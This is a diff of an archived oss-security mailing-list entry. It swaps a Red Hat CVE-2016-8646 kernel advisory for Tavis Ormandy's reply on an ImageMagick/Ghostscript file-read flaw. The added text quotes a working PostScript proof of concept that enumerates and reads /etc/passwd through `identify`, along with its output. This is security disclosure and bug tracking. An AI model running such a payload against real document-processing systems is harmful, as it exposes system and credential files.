@@ -1,36 +1,79 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/11/15/2
-Message-ID: <CALJHwhRq0gS+0H-iFUm9kr2kDGoGXa01=ZakM=FwraBdAZoSCQ@mail.gmail.com>
-Date: Tue, 15 Nov 2016 12:25:35 +1000
-From: Wade Mealing <wmealing@...hat.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/29/8
+Message-ID: <CAJ_zFk+T7TD7Ke=k7kbRbxGfnyARQXX1YxGehshKj11RxQD6BA@mail.gmail.com>
+Date: Thu, 29 Sep 2016 05:02:19 -0700
+From: Tavis Ormandy <taviso@...gle.com>
 To: oss-security@...ts.openwall.com
-Subject: CVE-2016-8646: linux kernel - oops in shash_async_export()
+Subject: Re: ImageMagick identify "d:" hangs
 Content-Type: text/plain; charset=utf-8
 
-Gday,
+On Wed, Sep 28, 2016 at 11:25 PM, Florian Weimer <fw@...eb.enyo.de> wrote:
+>
+> * Tavis Ormandy:
+>
+> > Here is the code I'm testing with (Note: I really don't know much
+> > postscript - and I hate it).
+> >
+> > $ cat test.ps
+> > /dumpname {
+> >     dup             % copy filename
+> >     dup             % copy filename
+> >     print           % print filename
+> >     (\n) print      % print newline
+> >     status          % stat filename
+> >     {
+> >         (stat succeeded\n) print
+> >         ( ctime:) print
+> >         64 string cvs print
+> >         ( atime:) print
+> >         64 string cvs print
+> >         ( size:) print
+> >         64 string cvs print
+> >         ( blocks:) print
+> >         64 string cvs print
+> >         (\n) print
+> >         (\n) print
+> >     }{
+> >         (unable to stat\n\n) print
+> >     } ifelse
+> >     .libfile        % open as library
+> >     {
+> >         (.libfile returned file\n\n) print
+> >         64 string readstring
+> >         pop         % discard result (should proably test)
+> >         print
+> >         (\n) print
+> >     }{
+> >         (.libfile returned string\n) print
+> >         print
+> >         (\n) print
+> >     } ifelse
+> > } def
+> >
+> > (/etc/pass*) /dumpname load 256 string filenameforall
+>
+> filenameforall was fixed as part of this:
+>
+>   http://git.ghostscript.com/?p=ghostpdl.git;a=commit;h=ab109aaeb3ddba59518b036fb288402a65cf7ce8
+>   http://bugs.ghostscript.com/show_bug.cgi?id=694724
+>
+> This also covers getenv and has already been assigned CVE-2013-5653.
 
-Igor Redko from Virtuozzo found a vulnerability was found in the Linux
-kernel. An unprivileged local user could triger oops in
-shash_async_export() by attempting to force the in-kernel hashing
-algorithms into decrypting an empty data set.  Not all in kernel algorithms
-are affected.
+Thanks Florian, that explains it, although the distros do not appear
+to have picked that patch up.
 
-Upstream has already fixed this issue (See upstream patch) in 4.4rc1.
+>
+> > $ identify test.ps
+> > /etc/passwd
+> > stat succeeded
+> >  ctime:1474998792 atime:1474998792 size:2662 blocks:8
+> >
+> > .libfile returned file
+>
+> .libfile is not yet fixed upstream.  I reported this upstream:
+>
+>   http://bugs.ghostscript.com/show_bug.cgi?id=697169
 
-Thanks,
+Thanks - seems like bad news for any automated image/document processing.
 
-Wade Mealing
-Red Hat Product Security
-
-
-Upstream discussion:
-
-https://lkml.org/lkml/2016/10/12/198
-
-Upstream patch:
-
-https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=4afa5f9617927453ac04b24b584f6c718dfb4f45
-
-Red Hat Bugzilla:
-https://bugzilla.redhat.com/show_bug.cgi?id=1388821
-
+Tavis.
